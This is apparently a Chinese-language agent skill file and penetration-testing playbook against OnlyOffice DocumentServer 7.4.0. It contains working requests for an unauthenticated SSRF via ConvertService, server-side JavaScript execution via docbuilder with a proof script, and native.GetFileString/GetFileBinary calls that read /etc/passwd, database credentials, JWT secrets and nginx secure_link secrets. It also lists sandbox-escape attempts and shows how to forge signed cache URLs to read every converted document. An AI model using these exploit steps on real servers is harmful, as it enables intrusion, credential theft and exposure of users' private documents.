---
name: onlyoffice-docbuilder-sandbox
description: OnlyOffice docbuilder 代码执行/文件读。触发:onlyoffice,docbuilder。
---

# OnlyOffice DocumentServer docbuilder：服务端 JS 执行 + 容器任意文件读

**适用**：目标以反向代理暴露 OnlyOffice（典型 `/onlyoffice/...`）。实测 7.4.0 Build 163（Docker 容器，Ubuntu 22.04，非 root）。

## 一、识别
```
GET /onlyoffice/healthcheck         → true
GET /onlyoffice/index.html          → Server is functioning normally. Version: 7.4.0 ...
GET /onlyoffice/ConvertService.ashx → 路由存在（GET 回 FileResult/Error）
```

## 二、匿名转换（= SSRF 取数原语）
```
POST /onlyoffice/ConvertService.ashx  {"url":"<任意URL>","outputtype":"pdf","key":"k1","filetype":"docx","title":"t.pdf"}
→ {"fileUrl":".../cache/files/data/conv_k1_pdf/output.pdf/t.pdf?md5=..&expires=.."}
```
- **无需 JWT**；会去取 `url`（OOB 可验证，UA `Node.js/6.13`）
- 产物落 `cache/files/data/<key>/output/<name>/<name>`，**签名随响应返回**可直接下载
- `async:true` → `{"percent":0,"endConvert":false}`；**`callbackUrl` 不被使用**（无回连）

## 三、docbuilder = 服务端 JS 执行（核心）
```
POST /onlyoffice/docbuilder?url=<脚本URL或zip>    → {"key":"bld_xxx","urls":{"out.docx":"<签名URL>"},"end":true}
POST /onlyoffice/docbuilder?json=true  (body=zip) → 同上
```
**两条铁律（踩过）**：
1. **脚本第一句必须是 `builder.CreateFile("docx");`** —— 否则整脚本不执行、`urls` 为空（这不是沙箱拦截！）
2. **`builder` 只能在顶层语句直接引用**；放进 `function(){}`/`try{}` 里会 `ReferenceError: builder is not defined` → 需 `var B = builder;` 顶层捕获后再用

最小验证脚本：
```js
builder.CreateFile("docx");
var d = Api.GetDocument();
var p = Api.CreateParagraph();
p.AddText("PROOF_EXEC_OK");
d.Push(p);
builder.SaveFile("docx","proof.docx");
builder.CloseFile();
```
`urls` 里给签名 URL → 下载即证明执行。

## 四、容器内任意文件读（native）
沙箱 `globalThis` 里的 **`native`**：
```
SetFilePath,GetFilePath,SetFileId,GetFileId,GetFileBinary,GetFontBinary,GetFontsDirectory,
GetFileString,GetEditorType,CheckNextChange,GetCountChanges,GetChangesFile,Save_End,AddImageInChanges,
ConsoleLog,ZipOpen,ZipOpenBase64,ZipFileAsString,ZipFileAsBinary,ZipClose,getImageUrl,getImagesDirectory,GetImageOriginalSize
```
- `native.GetFileString(path)` 读文本；二进制返回字节数组；`native.GetFileBinary(path)` 读任意二进制（实测 131MB 可读）
- 实测可读：`/etc/passwd`、`/etc/os-release`、`/etc/hosts`、`/etc/nginx/nginx.conf`、
  **`/etc/onlyoffice/documentserver/local.json`**（PG `onlyoffice/onlyoffice@localhost:5432`、RabbitMQ `guest@localhost`、**JWT secrets**、`allowPrivateIPAddress:true`）、
  `/etc/nginx/includes/ds-*.conf`（含 `secure_link_secret`）、`/var/www/onlyoffice/...` 二进制
- ❌ `/snapshot/**`（DocService 源码）与 `/proc/**` 读不到（权限/size=0）

## 五、写能力：没有
- `CreateNativeZip()` → `{open,create,save,addFile,removeFile,close,getPaths,...}`：`save()` **返回字节不落盘**；`addFile(name,data)` 签名不符返回 false
- `builder.SaveFile(fmt,name)`：`name` 含**相对/绝对路径穿越 → 硬中止整个脚本**，无文件产生
- 结论：只能写 builder 自己的 cache，**拿不到任意文件写**

## 六、沙箱性质与逃逸失败清单（勿重复）
Proxy 型运行时沙箱 + 原型链重绑：
- `Object.getOwnPropertyDescriptor(function(),"constructor")` → **undefined**
- `native.GetFileString` 虽是 `[native code]`，`.constructor` 也被重绑 → `Function("return process")()` 报 **`process is not defined`**
- 失败清单：`this.constructor.constructor`｜`[]` 原型链｜字符串拼接绕关键字｜`Object.keys(this)`｜vm2 经典 Proxy-apply-trap｜`args["constructor"]`｜`WebAssembly` — 全部失败
- `globalThis` 可用但是沙箱 realm：数组/对象/`Object`/`Map`/`Set`/`Promise`/`Proxy`/`Reflect`/`WebAssembly`/`eval`/`Function` 都在、都被重绑
- 另有 `window`、`document`、`jQuery`、`Asc*`(sdkjs Office API)、`CreateNativeEngine/Graphics/Zip/TextMeasurer/MemoryStream/Hash`

## 七、可研究方向
- `Asc*`/sdkjs 的 office JS 引擎与 `CreateNativeEngine` 是否有内存破坏/类型混淆
- 其它组件/路由：`coauthoring`、`example`(:3000)、内部路由
- cache 由 nginx `secure_link` 托管：**拿到 secret 可自签任意 cache 路径 URL**（读缓存 = 平台上一切被转换过的文档）

## 八、纪律
- 只用于取证/文件读；不在生产跑破坏性脚本
- 产出的 cache 文件会留在目标上，收工前记录路径
